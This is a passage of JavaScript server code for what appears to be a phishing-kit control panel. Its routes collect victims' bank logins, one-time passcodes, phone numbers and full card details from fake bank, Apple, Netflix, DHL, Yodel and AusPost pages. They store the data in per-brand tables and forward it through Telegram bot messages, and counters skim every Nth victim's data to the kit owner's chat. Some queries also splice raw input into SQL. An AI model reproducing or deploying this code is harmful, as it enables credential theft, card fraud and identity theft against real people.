      let updateQuery = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 2 WHERE uniqueid = ?`;

      panelConnection.query(updateQuery, updateDetails, (err, rows, fields) => {
        if (!err) res.send("Insertion Completed");
        else console.log(err);
      });
      return;
    } else {
      let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
      let query = `INSERT INTO apple(ccname,ccnum, ccexp, cvv, status,uniqueid, owner) VALUES (?,?,?,?,2,?,?)`;
      panelConnection.query(query, details, (err, rows, fields) => {
        if (!err) res.send("Insertion Completed");
        else console.log(err);
      });
    }
  });
});

app.post("/appleSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE apple SET otp= ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleSaveTelephone", cors(), (req, res) => {
  const { uniqueid, telephone } = req.body;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE apple SET telephone= ?, status = 10 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleSaveCCAgain", cors(), (req, res) => {
  const { ccname, ccnum, ccexp, cvv, uniqueid } = req.body;

  let details = [ccname, ccnum, ccexp, cvv, uniqueid];
  let query = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 8 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleSaveAuth", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;

  let details = [uniqueid];
  let query = `UPDATE apple SET status = 6 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/appleDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM apple WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BOI
app.use("/boi", require("./routes/boi"));

//ASB
app.use("/asb", require("./routes/asb"));

//BNZ
app.use("/bnz", require("./routes/bnz"));

//LLOYDS
app.use("/lloyds", require("./routes/lloyds"));

//BINANCE
app.use("/binance", require("./routes/binance"));

//UBANK
app.use("/ubank", require("./routes/ubank"));

//SUNCORP
app.use("/suncorp", require("./routes/suncorp"));

//UBANK IVR
app.use("/ubankIVR", require("./routes/ubankIVR"));

//UBANKONE
app.use("/ubankOne", require("./routes/ubankOne"));

//NAB

app.use("/nab", require("./routes/nab"));

app.get("/nabCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/nabCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM nab WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/nabCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE nab SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.get("/nabCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM nab WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/nabSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO nab(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/nabSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE nab SET otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/nabSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE nab SET telephone=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

//MULTIPANEL NZ
app.use("/multiNZ", require("./routes/multiNZ"));

//MULTIPANEL
//MULTIPANEL
//MULTIPANEL

app.get("/multiCustomers/:owner", async (req, result) => {
  owner = req.params.owner;
  let res = [];
  panelConnection.query(
    `SELECT * FROM bendi WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "Bendigo";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM anz WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "ANZ";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM wp WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "WestPac";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM nab WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "NAB";
        res.push(row);
      });
    }
  );
  panelConnection.query(
    `SELECT * FROM cb WHERE owner = "${owner}"`,
    (err, rows, fields) => {
      rows.forEach((row) => {
        row.panel = "CommBank";
        res.push(row);
      });
      result.send(res);
    }
  );
});

//STGEORGE
//STGEORGE
//STGEORGE

app.get("/georgeCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM george WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.get("/georgeCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM george WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.post("/georgeCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE george SET status = ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.post("/georgeSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE george SET telephone=?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/georgeSaveOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  otp = req.body.otp;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE george SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/georgeSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cvv = req.body.cvv;
  owner = req.body.owner;

  let details = [ccnum, ccexp, cvv, uniqueid, owner];
  let query = `UPDATE george SET ccnum=?, ccexp=?, cvv=?, status = 8 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.post("/georgeSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  accessNo = req.body.accessNo;
  password = req.body.password;
  secNo = req.body.secNo;
  owner = req.body.owner;

  let details = [accessNo, password, secNo, uniqueid];
  let query = `UPDATE george SET accessNo=?, password=?,secNo=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.get("/georgeCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM george WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let georgeCount = 0;

app.post("/georgeSaveLogin", cors(), (req, res) => {
  accessNo = req.body.accessNo;
  password = req.body.password;
  secNo = req.body.secNo;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (georgeCount == 20) {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New george Hit:\n${accessNo}`
    );

    let details = [accessNo, password, secNo, uniqueid, ip, "haytchPanel123!"];
    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    georgeCount = 0;
  } else {
    let details = [accessNo, password, secNo, uniqueid, ip, owner];
    let query = `INSERT INTO george(accessNo,password,secNo,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    georgeCount += 1;
  }
});

app.post("/georgeDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM george WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//AIB
app.use("/aib", require("./routes/aib"));

//VANQUIS
app.use("/vanquis", require("./routes/vanquis"));

//BENDIGO
app.use("/bendigo", require("./routes/bendigo"));

//RURAL
app.use("/rural", require("./routes/rural"));

//AUSPOSTwLogs
//AUSPOSTwLogs
//AUSPOSTwLogs

app.post("/ausPostLog", (req, res) => {
  username = req.body.username;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

app.post("/ausPostStGeorgeLog", (req, res) => {
  accessNo = req.body.accessNo;
  secNo = req.body.secNo;
  password = req.body.password;
  bank = req.body.bank;
  owner = req.body.owner;
  uniqueid = req.body.uniqueid;

  var originalText = `+----------- ${bank} Login Information ------------+\nAccess Number: ${accessNo}\nSecurity Number: ${secNo}\nPassword: ${password}`;

  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLog ${owner}:\n${originalText}`
  );
  axios.post(
    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=AusPostLog:\n${originalText}`
  );

  res.send("Update Completed");
});

//O2
app.use("/o2", require("./routes/o2"));

//AUSPOST
app.use("/auspost", require("./routes/auspost"));

//MEDICARE
app.use("/medicare", require("./routes/medicare"));

//PEOPLES
app.use("/people", require("./routes/people"));

//DHL
//DHL
//DHL

let mason = 4;

app.post("/masonDHL", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

//NETLIX
//NETLIX
//NETLIX

app.post("/fpaysNetflix", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      var loginText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
      if (fpaysC == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        fpaysC = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixFpays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Netflix:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NetflixLogin:\n${loginText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

//YODEL
//YODEL
//YODEL

app.post("/sendYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `YodelTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1190384225,
            text: `Yodel:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Completed");
    });
});

let ssCount = 0;

app.post("/sendSSYodelres", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

let yodelM4STERB0Y = 0;

app.post("/yodelM4STERB0Y", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yodelM4STERB0Y == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        yodelM4STERB0Y = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
        );
        yodelM4STERB0Y += 1;
      }

      res.send("Update Completed");
    });
});

let arcount = 0;

app.post("/sendARRYodelRes", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (arcount == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        arcount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
        );
        arcount += 1;
      }

      res.send("Update Completed");
    });
});

app.post("/mazzaYodel", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
